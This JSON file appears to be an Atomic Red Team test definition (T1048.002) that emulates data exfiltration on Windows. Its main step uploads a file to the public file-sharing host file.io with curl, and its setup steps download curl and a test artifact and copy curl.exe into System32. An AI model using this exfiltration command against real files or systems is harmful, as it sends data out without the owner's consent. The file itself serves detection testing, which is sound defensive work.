{
  "id": "1cdf2fb0-51b6-4fd8-96af-77020d5f1bf0",
  "name": "Exfiltrate data HTTPS using curl windows",
  "description": "Exfiltrate data HTTPS using curl to file share site file.io\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "e2dcf350-d79a-4d3e-ae7c-fceb9d90bba5",
      "type": "execute-command",
      "data": {
        "command": "#{curl_path} -k -F \"file=@#{input_file}\" https://file.io/\n",
        "command_type": "command_prompt"
      },
      "elevation_required": false
    },
    {
      "id": "f1cdae34-9686-4651-97f9-9309768b0088",
      "name": "Check dependency 1/2",
      "description": "Curl must be installed on system.\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path #{curl_path}) {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "78b6bace-3500-4b83-94aa-ea537ec0ee06",
      "name": "Resolve dependency 1/2",
      "description": "Curl must be installed on system.\n",
      "type": "execute-command",
      "data": {
        "command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://curl.se/windows/dl-8.4.0_6/curl-8.4.0_6-win64-mingw.zip\" -Outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl.zip\"\nExpand-Archive -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl.zip\" -DestinationPath \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl\"\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl\\curl-8.4.0_6-win64-mingw\\bin\\curl.exe\" C:\\Windows\\System32\\Curl.exe\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "5b521e38-4119-4e03-b582-0f58f61962c1",
      "name": "Re-check dependency 1/2",
      "description": "Curl must be installed on system.\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path #{curl_path}) {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "7a309dba-4744-42df-bdf0-07ee63df60e6",
      "name": "Check dependency 2/2",
      "description": "#{input_file} must be exist on system.\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{input_file}\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "42b6e16a-e146-4eda-8ac0-4c2b7131a51d",
      "name": "Resolve dependency 2/2",
      "description": "#{input_file} must be exist on system.\n",
      "type": "execute-command",
      "data": {
        "command": "New-Item -Type Directory (split-path \"#{input_file}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1048.002/src/artifact\" -OutFile \"#{input_file}\"\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "d43d8555-c0a9-4799-a367-0e18e133a9b1",
      "name": "Re-check dependency 2/2",
      "description": "#{input_file} must be exist on system.\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{input_file}\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "f1cdae34-9686-4651-97f9-9309768b0088",
      "p": "on-success",
      "o": "e2dcf350-d79a-4d3e-ae7c-fceb9d90bba5"
    },
    {
      "s": "f1cdae34-9686-4651-97f9-9309768b0088",
      "p": "on-failure",
      "o": "78b6bace-3500-4b83-94aa-ea537ec0ee06"
    },
    {
      "s": "78b6bace-3500-4b83-94aa-ea537ec0ee06",
      "p": "on-success",
      "o": "5b521e38-4119-4e03-b582-0f58f61962c1"
    },
    {
      "s": "5b521e38-4119-4e03-b582-0f58f61962c1",
      "p": "on-failure",
      "o": "e2dcf350-d79a-4d3e-ae7c-fceb9d90bba5"
    },
    {
      "s": "7a309dba-4744-42df-bdf0-07ee63df60e6",
      "p": "on-success",
      "o": "e2dcf350-d79a-4d3e-ae7c-fceb9d90bba5"
    },
    {
      "s": "7a309dba-4744-42df-bdf0-07ee63df60e6",
      "p": "on-failure",
      "o": "42b6e16a-e146-4eda-8ac0-4c2b7131a51d"
    },
    {
      "s": "42b6e16a-e146-4eda-8ac0-4c2b7131a51d",
      "p": "on-success",
      "o": "d43d8555-c0a9-4799-a367-0e18e133a9b1"
    },
    {
      "s": "d43d8555-c0a9-4799-a367-0e18e133a9b1",
      "p": "on-failure",
      "o": "e2dcf350-d79a-4d3e-ae7c-fceb9d90bba5"
    }
  ],
  "tags": [
    "T1048.002",
    "atomic-red-team"
  ],
  "input_arguments": [
    {
      "name": "input_file",
      "type": "path",
      "description": "Test file to upload",
      "value": "PathToAtomicsFolder/T1048.002/src/artifact"
    },
    {
      "name": "curl_path",
      "type": "path",
      "description": "path to curl.exe",
      "value": "C:\\Windows\\System32\\Curl.exe"
    }
  ]
}